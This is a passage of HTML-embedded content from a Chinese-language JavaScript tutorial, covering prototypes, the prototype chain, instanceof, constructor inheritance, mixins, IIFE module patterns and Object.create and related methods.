&#039;白色&#039;</code></pre><p>上面代码中，<code>Cat</code>函数是一个构造函数，函数内部定义了<code>name</code>属性和<code>color</code>属性，所有实例对象（上例是<code>cat1</code>）都会生成这两个属性，即这两个属性会定义在实例对象上面。</p>\n<p>通过构造函数为实例对象定义属性，虽然很方便，但是有一个缺点。同一个构造函数的多个实例之间，无法共享属性，从而造成对系统资源的浪费。</p>\n<pre class=\"prettyprint language-javascript\"><code>function Cat(name, color) {\n  this.name = name;\n  this.color = color;\n  this.meow = function () {\n    console.log(&#039;喵喵&#039;);\n  };\n}\n\nvar cat1 = new Cat(&#039;大毛&#039;, &#039;白色&#039;);\nvar cat2 = new Cat(&#039;二毛&#039;, &#039;黑色&#039;);\n\ncat1.meow === cat2.meow\n// false</code></pre><p>上面代码中，<code>cat1</code>和<code>cat2</code>是同一个构造函数的两个实例，它们都具有<code>meow</code>方法。由于<code>meow</code>方法是生成在每个实例对象上面，所以两个实例就生成了两次。也就是说，每新建一个实例，就会新建一个<code>meow</code>方法。这既没有必要，又浪费系统资源，因为所有<code>meow</code>方法都是同样的行为，完全应该共享。</p>\n<p>这个问题的解决方法，就是 JavaScript 的原型对象（prototype）。</p>\n\n        <h3>\n            <a href='#prototype-属性的作用' class='header-anchor'>#</a>\n            <span>prototype 属性的作用</span>\n        </h3>\n    <p>JavaScript 继承机制的设计思想就是，原型对象的所有属性和方法，都能被实例对象共享。也就是说，如果属性和方法定义在原型上，那么所有实例对象就能共享，不仅节省了内存，还体现了实例对象之间的联系。</p>\n<p>下面，先看怎么为对象指定原型。JavaScript 规定，每个函数都有一个<code>prototype</code>属性，指向一个对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {}\ntypeof f.prototype // &quot;object&quot;</code></pre><p>上面代码中，函数<code>f</code>默认具有<code>prototype</code>属性，指向一个对象。</p>\n<p>对于普通函数来说，该属性基本无用。但是，对于构造函数来说，生成实例的时候，该属性会自动成为实例对象的原型。</p>\n<pre class=\"prettyprint language-javascript\"><code>function Animal(name) {\n  this.name = name;\n}\nAnimal.prototype.color = &#039;white&#039;;\n\nvar cat1 = new Animal(&#039;大毛&#039;);\nvar cat2 = new Animal(&#039;二毛&#039;);\n\ncat1.color // &#039;white&#039;\ncat2.color // &#039;white&#039;</code></pre><p>上面代码中，构造函数<code>Animal</code>的<code>prototype</code>属性，就是实例对象<code>cat1</code>和<code>cat2</code>的原型对象。原型对象上添加一个<code>color</code>属性，结果，实例对象都共享了该属性。</p>\n<p>原型对象的属性不是实例对象自身的属性。只要修改原型对象，变动就立刻会体现在<strong>所有</strong>实例对象上。</p>\n<pre class=\"prettyprint language-javascript\"><code>Animal.prototype.color = &#039;yellow&#039;;\n\ncat1.color // &quot;yellow&quot;\ncat2.color // &quot;yellow&quot;</code></pre><p>上面代码中，原型对象的<code>color</code>属性的值变为<code>yellow</code>，两个实例对象的<code>color</code>属性立刻跟着变了。这是因为实例对象其实没有<code>color</code>属性，都是读取原型对象的<code>color</code>属性。也就是说，当实例对象本身没有某个属性或方法的时候，它会到原型对象去寻找该属性或方法。这就是原型对象的特殊之处。</p>\n<p>如果实例对象自身就有某个属性或方法，它就不会再去原型对象寻找这个属性或方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>cat1.color = &#039;black&#039;;\n\ncat1.color // &#039;black&#039;\ncat2.color // &#039;yellow&#039;\nAnimal.prototype.color // &#039;yellow&#039;;</code></pre><p>上面代码中，实例对象<code>cat1</code>的<code>color</code>属性改为<code>black</code>，就使得它不再去原型对象读取<code>color</code>属性，后者的值依然为<code>yellow</code>。</p>\n<p>总结一下，原型对象的作用，就是定义所有实例对象共享的属性和方法。这也是它被称为原型对象的原因，而实例对象可以视作从原型对象衍生出来的子对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>Animal.prototype.walk = function () {\n  console.log(this.name + &#039; is walking&#039;);\n};</code></pre><p>上面代码中，<code>Animal.prototype</code>对象上面定义了一个<code>walk</code>方法，这个方法将可以在所有<code>Animal</code>实例对象上面调用。</p>\n\n        <h3>\n            <a href='#原型链' class='header-anchor'>#</a>\n            <span>原型链</span>\n        </h3>\n    <p>JavaScript 规定，所有对象都有自己的原型对象（prototype）。一方面，任何一个对象，都可以充当其他对象的原型；另一方面，由于原型对象也是对象，所以它也有自己的原型。因此，就会形成一个“原型链”（prototype chain）：对象到原型，再到原型的原型……</p>\n<p>如果一层层地上溯，所有对象的原型最终都可以上溯到<code>Object.prototype</code>，即<code>Object</code>构造函数的<code>prototype</code>属性。也就是说，所有对象都继承了<code>Object.prototype</code>的属性。这就是所有对象都有<code>valueOf</code>和<code>toString</code>方法的原因，因为这是从<code>Object.prototype</code>继承的。</p>\n<p>那么，<code>Object.prototype</code>对象有没有它的原型呢？回答是<code>Object.prototype</code>的原型是<code>null</code>。<code>null</code>没有任何属性和方法，也没有自己的原型。因此，原型链的尽头就是<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.getPrototypeOf(Object.prototype)\n// null</code></pre><p>上面代码表示，<code>Object.prototype</code>对象的原型是<code>null</code>，由于<code>null</code>没有任何属性，所以原型链到此为止。<code>Object.getPrototypeOf</code>方法返回参数对象的原型，具体介绍请看后文。</p>\n<p>读取对象的某个属性时，JavaScript 引擎先寻找对象本身的属性，如果找不到，就到它的原型去找，如果还是找不到，就到原型的原型去找。如果直到最顶层的<code>Object.prototype</code>还是找不到，则返回<code>undefined</code>。如果对象自身和它的原型，都定义了一个同名属性，那么优先读取对象自身的属性，这叫做“覆盖”（overriding）。</p>\n<p>注意，一级级向上，在整个原型链上寻找某个属性，对性能是有影响的。所寻找的属性在越上层的原型对象，对性能的影响越大。如果寻找某个不存在的属性，将会遍历整个原型链。</p>\n<p>举例来说，如果让构造函数的<code>prototype</code>属性指向一个数组，就意味着实例对象可以调用数组方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var MyArray = function () {};\n\nMyArray.prototype = new Array();\nMyArray.prototype.constructor = MyArray;\n\nvar mine = new MyArray();\nmine.push(1, 2, 3);\nmine.length // 3\nmine instanceof Array // true</code></pre><p>上面代码中，<code>mine</code>是构造函数<code>MyArray</code>的实例对象，由于<code>MyArray.prototype</code>指向一个数组实例，使得<code>mine</code>可以调用数组方法（这些方法定义在数组实例的<code>prototype</code>对象上面）。最后那行<code>instanceof</code>表达式，用来比较一个对象是否为某个构造函数的实例，结果就是证明<code>mine</code>为<code>Array</code>的实例，<code>instanceof</code>运算符的详细解释详见后文。</p>\n<p>上面代码还出现了原型对象的<code>contructor</code>属性，这个属性的含义下一节就来解释。</p>\n\n        <h3>\n            <a href='#constructor-属性' class='header-anchor'>#</a>\n            <span>constructor 属性</span>\n        </h3>\n    <p><code>prototype</code>对象有一个<code>constructor</code>属性，默认指向<code>prototype</code>对象所在的构造函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function P() {}\nP.prototype.constructor === P // true</code></pre><p>由于<code>constructor</code>属性定义在<code>prototype</code>对象上面，意味着可以被所有实例对象继承。</p>\n<pre class=\"prettyprint language-javascript\"><code>function P() {}\nvar p = new P();\n\np.constructor === P // true\np.constructor === P.prototype.constructor // true\np.hasOwnProperty(&#039;constructor&#039;) // false</code></pre><p>上面代码中，<code>p</code>是构造函数<code>P</code>的实例对象，但是<code>p</code>自身没有<code>constructor</code>属性，该属性其实是读取原型链上面的<code>P.prototype.constructor</code>属性。</p>\n<p><code>constructor</code>属性的作用是，可以得知某个实例对象，到底是哪一个构造函数产生的。</p>\n<pre class=\"prettyprint language-javascript\"><code>function F() {};\nvar f = new F();\n\nf.constructor === F // true\nf.constructor === RegExp // false</code></pre><p>上面代码中，<code>constructor</code>属性确定了实例对象<code>f</code>的构造函数是<code>F</code>，而不是<code>RegExp</code>。</p>\n<p>另一方面，有了<code>constructor</code>属性，就可以从一个实例对象新建另一个实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>function Constr() {}\nvar x = new Constr();\n\nvar y = new x.constructor();\ny instanceof Constr // true</code></pre><p>上面代码中，<code>x</code>是构造函数<code>Constr</code>的实例，可以从<code>x.constructor</code>间接调用构造函数。这使得在实例方法中，调用自身的构造函数成为可能。</p>\n<pre class=\"prettyprint language-javascript\"><code>Constr.prototype.createCopy = function () {\n  return new this.constructor();\n};</code></pre><p>上面代码中，<code>createCopy</code>方法调用构造函数，新建另一个实例。</p>\n<p><code>constructor</code>属性表示原型对象与构造函数之间的关联关系，如果修改了原型对象，一般会同时修改<code>constructor</code>属性，防止引用的时候出错。</p>\n<pre class=\"prettyprint language-javascript\"><code>function Person(name) {\n  this.name = name;\n}\n\nPerson.prototype.constructor === Person // true\n\nPerson.prototype = {\n  method: function () {}\n};\n\nPerson.prototype.constructor === Person // false\nPerson.prototype.constructor === Object // true</code></pre><p>上面代码中，构造函数<code>Person</code>的原型对象改掉了，但是没有修改<code>constructor</code>属性，导致这个属性不再指向<code>Person</code>。由于<code>Person</code>的新原型是一个普通对象，而普通对象的<code>contructor</code>属性指向<code>Object</code>构造函数，导致<code>Person.prototype.constructor</code>变成了<code>Object</code>。</p>\n<p>所以，修改原型对象时，一般要同时修改<code>constructor</code>属性的指向。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 坏的写法\nC.prototype = {\n  method1: function (...) { ... },\n  // ...\n};\n\n// 好的写法\nC.prototype = {\n  constructor: C,\n  method1: function (...) { ... },\n  // ...\n};\n\n// 更好的写法\nC.prototype.method1 = function (...) { ... };</code></pre><p>上面代码中，要么将<code>constructor</code>属性重新指向原来的构造函数，要么只在原型对象上添加方法，这样可以保证<code>instanceof</code>运算符不会失真。</p>\n<p>如果不能确定<code>constructor</code>属性是什么函数，还有一个办法：通过<code>name</code>属性，从实例得到构造函数的名称。</p>\n<pre class=\"prettyprint language-javascript\"><code>function Foo() {}\nvar f = new Foo();\nf.constructor.name // &quot;Foo&quot;</code></pre>\n        <h2>\n            <a href='#instanceof-运算符' class='header-anchor'>#</a>\n            <span>instanceof 运算符</span>\n        </h2>\n    <p><code>instanceof</code>运算符返回一个布尔值，表示对象是否为某个构造函数的实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v = new Vehicle();\nv instanceof Vehicle // true</code></pre><p>上面代码中，对象<code>v</code>是构造函数<code>Vehicle</code>的实例，所以返回<code>true</code>。</p>\n<p><code>instanceof</code>运算符的左边是实例对象，右边是构造函数。它会检查右边构建函数的原型对象（prototype），是否在左边对象的原型链上。因此，下面两种写法是等价的。</p>\n<pre class=\"prettyprint language-javascript\"><code>v instanceof Vehicle\n// 等同于\nVehicle.prototype.isPrototypeOf(v)</code></pre><p>上面代码中，<code>Object.prototype.isPrototypeOf</code>的详细解释见后文。</p>\n<p>由于<code>instanceof</code>检查整个原型链，因此同一个实例对象，可能会对多个构造函数都返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = new Date();\nd instanceof Date // true\nd instanceof Object // true</code></pre><p>上面代码中，<code>d</code>同时是<code>Date</code>和<code>Object</code>的实例，因此对这两个构造函数都返回<code>true</code>。</p>\n<p><code>instanceof</code>的原理是检查右边构造函数的<code>prototype</code>属性，是否在左边对象的原型链上。有一种特殊情况，就是左边对象的原型链上，只有<code>null</code>对象。这时，<code>instanceof</code>判断会失真。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.create(null);\ntypeof obj // &quot;object&quot;\nObject.create(null) instanceof Object // false</code></pre><p>上面代码中，<code>Object.create(null)</code>返回一个新对象<code>obj</code>，它的原型是<code>null</code>（<code>Object.create</code>的详细介绍见后文）。右边的构造函数<code>Object</code>的<code>prototype</code>属性，不在左边的原型链上，因此<code>instanceof</code>就认为<code>obj</code>不是<code>Object</code>的实例。但是，只要一个对象的原型不是<code>null</code>，<code>instanceof</code>运算符的判断就不会失真。</p>\n<p><code>instanceof</code>运算符的一个用处，是判断值的类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = [1, 2, 3];\nvar y = {};\nx instanceof Array // true\ny instanceof Object // true</code></pre><p>上面代码中，<code>instanceof</code>运算符判断，变量<code>x</code>是数组，变量<code>y</code>是对象。</p>\n<p>注意，<code>instanceof</code>运算符只能用于对象，不适用原始类型的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;hello&#039;;\ns instanceof String // false</code></pre><p>上面代码中，字符串不是<code>String</code>对象的实例（因为字符串不是对象），所以返回<code>false</code>。</p>\n<p>此外，对于<code>undefined</code>和<code>null</code>，<code>instanceOf</code>运算符总是返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>undefined instanceof Object // false\nnull instanceof Object // false</code></pre><p>利用<code>instanceof</code>运算符，还可以巧妙地解决，调用构造函数时，忘了加<code>new</code>命令的问题。</p>\n<pre class=\"prettyprint language-javascript\"><code>function Fubar (foo, bar) {\n  if (this instanceof Fubar) {\n    this._foo = foo;\n    this._bar = bar;\n  } else {\n    return new Fubar(foo, bar);\n  }\n}</code></pre><p>上面代码使用<code>instanceof</code>运算符，在函数体内部判断<code>this</code>关键字是否为构造函数<code>Fubar</code>的实例。如果不是，就表明忘了加<code>new</code>命令。</p>\n\n        <h2>\n            <a href='#构造函数的继承' class='header-anchor'>#</a>\n            <span>构造函数的继承</span>\n        </h2>\n    <p>让一个构造函数继承另一个构造函数，是非常常见的需求。这可以分成两步实现。第一步是在子类的构造函数中，调用父类的构造函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function Sub(value) {\n  Super.call(this);\n  this.prop = value;\n}</code></pre><p>上面代码中，<code>Sub</code>是子类的构造函数，<code>this</code>是子类的实例。在实例上调用父类的构造函数<code>Super</code>，就会让子类实例具有父类实例的属性。</p>\n<p>第二步，是让子类的原型指向父类的原型，这样子类就可以继承父类原型。</p>\n<pre class=\"prettyprint language-javascript\"><code>Sub.prototype = Object.create(Super.prototype);\nSub.prototype.constructor = Sub;\nSub.prototype.method = &#039;...&#039;;</code></pre><p>上面代码中，<code>Sub.prototype</code>是子类的原型，要将它赋值为<code>Object.create(Super.prototype)</code>，而不是直接等于<code>Super.prototype</code>。否则后面两行对<code>Sub.prototype</code>的操作，会连父类的原型<code>Super.prototype</code>一起修改掉。</p>\n<p>另外一种写法是<code>Sub.prototype</code>等于一个父类实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>Sub.prototype = new Super();</code></pre><p>上面这种写法也有继承的效果，但是子类会具有父类实例的方法。有时，这可能不是我们需要的，所以不推荐使用这种写法。</p>\n<p>举例来说，下面是一个<code>Shape</code>构造函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function Shape() {\n  this.x = 0;\n  this.y = 0;\n}\n\nShape.prototype.move = function (x, y) {\n  this.x += x;\n  this.y += y;\n  console.info(&#039;Shape moved.&#039;);\n};</code></pre><p>我们需要让<code>Rectangle</code>构造函数继承<code>Shape</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 第一步，子类继承父类的实例\nfunction Rectangle() {\n  Shape.call(this); // 调用父类构造函数\n}\n// 另一种写法\nfunction Rectangle() {\n  this.base = Shape;\n  this.base();\n}\n\n// 第二步，子类继承父类的原型\nRectangle.prototype = Object.create(Shape.prototype);\nRectangle.prototype.constructor = Rectangle;</code></pre><p>采用这样的写法以后，<code>instanceof</code>运算符会对子类和父类的构造函数，都返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var rect = new Rectangle();\n\nrect instanceof Rectangle  // true\nrect instanceof Shape  // true</code></pre><p>上面代码中，子类是整体继承父类。有时只需要单个方法的继承，这时可以采用下面的写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>ClassB.prototype.print = function() {\n  ClassA.prototype.print.call(this);\n  // some code\n}</code></pre><p>上面代码中，子类<code>B</code>的<code>print</code>方法先调用父类<code>A</code>的<code>print</code>方法，再部署自己的代码。这就等于继承了父类<code>A</code>的<code>print</code>方法。</p>\n\n        <h2>\n            <a href='#多重继承' class='header-anchor'>#</a>\n            <span>多重继承</span>\n        </h2>\n    <p>JavaScript 不提供多重继承功能，即不允许一个对象同时继承多个对象。但是，可以通过变通方法，实现这个功能。</p>\n<pre class=\"prettyprint language-javascript\"><code>function M1() {\n  this.hello = &#039;hello&#039;;\n}\n\nfunction M2() {\n  this.world = &#039;world&#039;;\n}\n\nfunction S() {\n  M1.call(this);\n  M2.call(this);\n}\n\n// 继承 M1\nS.prototype = Object.create(M1.prototype);\n// 继承链上加入 M2\nObject.assign(S.prototype, M2.prototype);\n\n// 指定构造函数\nS.prototype.constructor = S;\n\nvar s = new S();\ns.hello // &#039;hello：&#039;\ns.world // &#039;world&#039;</code></pre><p>上面代码中，子类<code>S</code>同时继承了父类<code>M1</code>和<code>M2</code>。这种模式又称为 Mixin（混入）。</p>\n\n        <h2>\n            <a href='#模块' class='header-anchor'>#</a>\n            <span>模块</span>\n        </h2>\n    <p>随着网站逐渐变成&quot;互联网应用程序&quot;，嵌入网页的 JavaScript 代码越来越庞大，越来越复杂。网页越来越像桌面程序，需要一个团队分工协作、进度管理、单元测试等等……开发者必须使用软件工程的方法，管理网页的业务逻辑。</p>\n<p>JavaScript 模块化编程，已经成为一个迫切的需求。理想情况下，开发者只需要实现核心的业务逻辑，其他都可以加载别人已经写好的模块。</p>\n<p>：&quot;污染&quot;了全局变量，无法保证不与其他模块发生变量名冲突，而且模块成员之间看不出直接关系。</p>\n<p>为了解决上面的缺点，可以<br>但是，JavaScript 不是一种模块化编程语言，ES6 才开始支持“类”和“模块”。下面介绍传统的做法，如何利用对象实现模块的效果。</p>\n\n        <h3>\n            <a href='#基本的实现方法' class='header-anchor'>#</a>\n            <span>基本的实现方法</span>\n        </h3>\n    <p>模块是实现特定功能的一组属性和方法的封装。</p>\n<p>简单的做法是把模块写成一个对象，所有的模块成员都放到这个对象里面。</p>\n<pre class=\"prettyprint language-javascript\"><code>var module1 = new Object({\n　_count : 0,\n　m1 : function (){\n　　//...\n　},\n　m2 : function (){\n  　//...\n　}\n});</code></pre><p>上面的函数<code>m1</code>和<code>m2</code>，都封装在<code>module1</code>对象里。使用的时候，就是调用这个对象的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>module1.m1();</code></pre><p>但是，这样的写法会暴露所有模块成员，内部状态可以被外部改写。比如，外部代码可以直接改变内部计数器的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>module1._count = 5;</code></pre>\n        <h3>\n            <a href='#封装私有变量：构造函数的写法' class='header-anchor'>#</a>\n            <span>封装私有变量：构造函数的写法</span>\n        </h3>\n    <p>我们可以利用构造函数，封装私有变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>function StringBuilder() {\n  var buffer = [];\n\n  this.add = function (str) {\n     buffer.push(str);\n  };\n\n  this.toString = function () {\n    return buffer.join(&#039;&#039;);\n  };\n\n}</code></pre><p>上面代码中，<code>buffer</code>是模块的私有变量。一旦生成实例对象，外部是无法直接访问<code>buffer</code>的。但是，这种方法将私有变量封装在构造函数中，导致构造函数与实例对象是一体的，总是存在于内存之中，无法在使用完成后清除。这意味着，构造函数有双重作用，既用来塑造实例对象，又用来保存实例对象的数据，违背了构造函数与实例对象在数据上相分离的原则（即实例对象的数据，不应该保存在实例对象以外）。同时，非常耗费内存。</p>\n<pre class=\"prettyprint language-javascript\"><code>function StringBuilder() {\n  this._buffer = [];\n}\n\nStringBuilder.prototype = {\n  constructor: StringBuilder,\n  add: function (str) {\n    this._buffer.push(str);\n  },\n  toString: function () {\n    return this._buffer.join(&#039;&#039;);\n  }\n};</code></pre><p>这种方法将私有变量放入实例对象中，好处是看上去更自然，但是它的私有变量可以从外部读写，不是很安全。</p>\n\n        <h3>\n            <a href='#封装私有变量：立即执行函数的写法' class='header-anchor'>#</a>\n            <span>封装私有变量：立即执行函数的写法</span>\n        </h3>\n    <p>另一种做法是使用“立即执行函数”（Immediately-Invoked Function Expression，IIFE），将相关的属性和方法封装在一个函数作用域里面，可以达到不暴露私有成员的目的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var module1 = (function () {\n　var _count = 0;\n　var m1 = function () {\n　  //...\n　};\n　var m2 = function () {\n　　//...\n　};\n　return {\n　　m1 : m1,\n　　m2 : m2\n　};\n})();</code></pre><p>使用上面的写法，外部代码无法读取内部的<code>_count</code>变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.info(module1._count); //undefined</code></pre><p>上面的<code>module1</code>就是 JavaScript 模块的基本写法。下面，再对这种写法进行加工。</p>\n\n        <h3>\n            <a href='#模块的放大模式' class='header-anchor'>#</a>\n            <span>模块的放大模式</span>\n        </h3>\n    <p>如果一个模块很大，必须分成几个部分，或者一个模块需要继承另一个模块，这时就有必要采用“放大模式”（augmentation）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var module1 = (function (mod){\n　mod.m3 = function () {\n　　//...\n　};\n　return mod;\n})(module1);</code></pre><p>上面的代码为<code>module1</code>模块添加了一个新方法<code>m3()</code>，然后返回新的<code>module1</code>模块。</p>\n<p>在浏览器环境中，模块的各个部分通常都是从网上获取的，有时无法知道哪个部分会先加载。如果采用上面的写法，第一个执行的部分有可能加载一个不存在空对象，这时就要采用&quot;宽放大模式&quot;（Loose augmentation）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var module1 = (function (mod) {\n　//...\n　return mod;\n})(window.module1 || {});</code></pre><p>与&quot;放大模式&quot;相比，“宽放大模式”就是“立即执行函数”的参数可以是空对象。</p>\n\n        <h3>\n            <a href='#输入全局变量' class='header-anchor'>#</a>\n            <span>输入全局变量</span>\n        </h3>\n    <p>独立性是模块的重要特点，模块内部最好不与程序的其他部分直接交互。</p>\n<p>为了在模块内部调用全局变量，必须显式地将其他变量输入模块。</p>\n<pre class=\"prettyprint language-javascript\"><code>var module1 = (function ($, YAHOO) {\n　//...\n})(jQuery, YAHOO);</code></pre><p>上面的<code>module1</code>模块需要使用 jQuery 库和 YUI 库，就把这两个库（其实是两个模块）当作参数输入<code>module1</code>。这样做除了保证模块的独立性，还使得模块之间的依赖关系变得明显。</p>\n<p>立即执行函数还可以起到命名空间的作用。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function($, window, document) {\n\n  function go(num) {\n  }\n\n  function handleEvents() {\n  }\n\n  function initialize() {\n  }\n\n  function dieCarouselDie() {\n  }\n\n  //attach to the global scope\n  window.finalCarousel = {\n    init : initialize,\n    destroy : dieCouraselDie\n  }\n\n})( jQuery, window, document );</code></pre><p>上面代码中，<code>finalCarousel</code>对象输出到全局，对外暴露<code>init</code>和<code>destroy</code>接口，内部方法<code>go</code>、<code>handleEvents</code>、<code>initialize</code>、<code>dieCarouselDie</code>都是外部无法调用的。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li><a href=\"https://medium.freecodecamp.com/javascript-modules-a-beginner-s-guide-783f7d7a5fcc\">JavaScript Modules: A Beginner’s Guide</a>, by Preethi Kasireddy</li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"面向对象编程","link":"javascript:void(0)"},{"title":"Object 对象的相关方法","link":"/oop/object.html"}],"content":"\n        <h1>\n            <a href='#Object-对象的相关方法' class='header-anchor'>#</a>\n            <span>Object 对象的相关方法</span>\n        </h1>\n    <p>JavaScript 在<code>Object</code>对象上面，提供了很多相关方法，处理面向对象编程的相关操作。本章介绍这些方法。</p>\n\n        <h2>\n            <a href='#Object.getPrototypeOf()' class='header-anchor'>#</a>\n            <span>Object.getPrototypeOf()</span>\n        </h2>\n    <p><code>Object.getPrototypeOf</code>方法返回参数对象的原型。这是获取原型对象的标准方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var F = function () {};\nvar f = new F();\nObject.getPrototypeOf(f) === F.prototype // true</code></pre><p>上面代码中，实例对象<code>f</code>的原型是<code>F.prototype</code>。</p>\n<p>下面是几种特殊对象的原型。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 空对象的原型是 Object.prototype\nObject.getPrototypeOf({}) === Object.prototype // true\n\n// Object.prototype 的原型是 null\nObject.getPrototypeOf(Object.prototype) === null // true\n\n// 函数的原型是 Function.prototype\nfunction f() {}\nObject.getPrototypeOf(f) === Function.prototype // true</code></pre>\n        <h2>\n            <a href='#Object.setPrototypeOf()' class='header-anchor'>#</a>\n            <span>Object.setPrototypeOf()</span>\n        </h2>\n    <p><code>Object.setPrototypeOf</code>方法为参数对象设置原型，返回该参数对象。它接受两个参数，第一个是现有对象，第二个是原型对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = {};\nvar b = {x: 1};\nObject.setPrototypeOf(a, b);\n\nObject.getPrototypeOf(a) === b // true\na.x // 1</code></pre><p>上面代码中，<code>Object.setPrototypeOf</code>方法将对象<code>a</code>的原型，设置为对象<code>b</code>，因此<code>a</code>可以共享<code>b</code>的属性。</p>\n<p><code>new</code>命令可以使用<code>Object.setPrototypeOf</code>方法模拟。</p>\n<pre class=\"prettyprint language-javascript\"><code>var F = function () {\n  this.foo = &#039;bar&#039;;\n};\n\nvar f = new F();\n// 等同于\nvar f = Object.setPrototypeOf({}, F.prototype);\nF.call(f);</code></pre><p>上面代码中，<code>new</code>命令新建实例对象，其实可以分成两步。第一步，将一个空对象的原型设为构造函数的<code>prototype</code>属性（上例是<code>F.prototype</code>）；第二步，将构造函数内部的<code>this</code>绑定这个空对象，然后执行构造函数，使得定义在<code>this</code>上面的方法和属性（上例是<code>this.foo</code>），都转移到这个空对象上。</p>\n\n        <h2>\n            <a href='#Object.create()' class='header-anchor'>#</a>\n            <span>Object.create()</span>\n        </h2>\n    <p>生成实例对象的常用方法是，使用<code>new</code>命令让构造函数返回一个实例。但是很多时候，只能拿到一个实例对象，它可能根本不是由构建函数生成的，那么能不能从一个实例对象，生成另一个实例对象呢？</p>\n<p>JavaScript 提供了<code>Object.create</code>方法，用来满足这种需求。该方法接受一个对象作为参数，然后以它为原型，返回一个实例对象。该实例完全继承原型对象的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 原型对象\nvar A = {\n  print: function () {\n    console.log(&#039;hello&#039;);\n  }\n};\n\n// 实例对象\nvar B = Object.create(A);\n\nObject.getPrototypeOf(B) === A // true\nB.print() // hello\nB.print === A.print // true</code></pre><p>上面代码中，<code>Object.create</code>方法以<code>A</code>对象为原型，生成了<code>B</code>对象。<code>B</code>继承了<code>A</code>的所有属性和方法。</p>\n<p>实际上，<code>Object.create</code>方法可以用下面的代码代替。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (typeof Object.create !== &#039;function&#039;) {\n  Object.create = function (obj) {\n    function F() {}\n    F.prototype = obj;\n    return new F();\n  };\n}</code></pre><p>上面代码表明，<code>Object.create</code>方法的实质是新建一个空的构造函数<code>F</code>，然后让<code>F.prototype</code>属性指向参数对象<code>obj</code>，最后返回一个<code>F</code>的实例，从而实现让该实例继承<code>obj</code>的属性。</p>\n<p>下面三种方式生成的新对象是等价的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj1 = Object.create({});\nvar obj2 = Object.create(Object.prototype);\nvar obj3 = new Object();</code></pre><p>如果想要生成一个不继承任何属性（比如没有<code>toString</code>和<code>valueOf</code>方法）的对象，可以将<code>Object.create</code>的参数设为<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.create(null);\n\nobj.valueOf()\n// TypeError: Object [object Object] has no method &#039;valueOf&#039;</code></pre><p>上面代码中，对象<code>obj</code>的原型是<code>null</code>，它就不具备一些定义在<code>Object.prototype</code>对象上面的属性，比如<code>valueOf</code>方法。</p>\n<p>使用<code>Object.create</code>方法的时候，必须提供对象原型，即参数不能为空，或者不是对象，否则会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>Object.create()\n// TypeError: Object prototype may only be an Object or null\nObject.create(123)\n// TypeError: Object prototype may only be an Object or null</code></pre><p><code>Object.create</code>方法生成的新对象，动态继承了原型。在原型上添加或修改任何方法，会立刻反映在新对象之上。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj1 = { p: 1 };\nvar obj2 = Object.create(obj1);\n\nobj1.p = 2;\nobj2.p // 2</code></pre><p>上面代码中，修改对象原型<code>obj1</code>会影响到实例对象<code>obj2</code>。</p>\n<p>除了对象的原型，<code>Object.create</code>方法还可以接受第二个参数。该参数是一个属性描述对象，它所描述的对象属性，会添加到实例对象，作为该对象自身的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.create({}, {\n  p1: {\n    value: 123,\n    enumerable: true,\n    configurable: true,\n    writable: true,\n  },\n  p2: {\n    value: &#039;abc&#039;,\n    enumerable: true,\n    configurable: true,\n    writable: true,\n  }\n});\n\n// 等同于\nvar obj = Object.create({});\nobj.p1 = 123;\nobj.p2 = &#039;abc&#039;;</code></pre><p><code>Object.create</code>方法生成的对象，继承了它的原型对象的构造函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function A() {}\nvar a = new A();\nvar b = Object.create(a);\n\nb.constructor === A // true\nb instanceof A // true</code></pre><p>上面代码中，<code>b</code>对象的原型是<code>a</code>对象，因此继承了<code>a</code>对象的构造函数<code>A</code>。</p>\n\n        <h2>\n            <a href='#Object.prototype.isPrototypeOf()' class='header-anchor'>#</a>\n            <span>Object.prototype.isPrototypeOf()</span>\n        </h2>\n    <p>实例对象的<code>isPrototypeOf</code>方法，用来判断该对象是否为参数对象的原型。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = {};\nvar o2 = Object.create(o1);\nvar o3 = Object.create(o2);\n\no2.isPrototypeOf(o3) // true\no1.isPrototypeOf(o3) // true</code></pre><p>上面代码中，<code>o1</code>和<code>o2</code>都是<code>o3</code>的原型。这表明只要实例对象处在参数对象的原型链上，<code>isPrototypeOf</code>方法都返回<code>true</code>。</p>\n<pre class=\"prettyprint 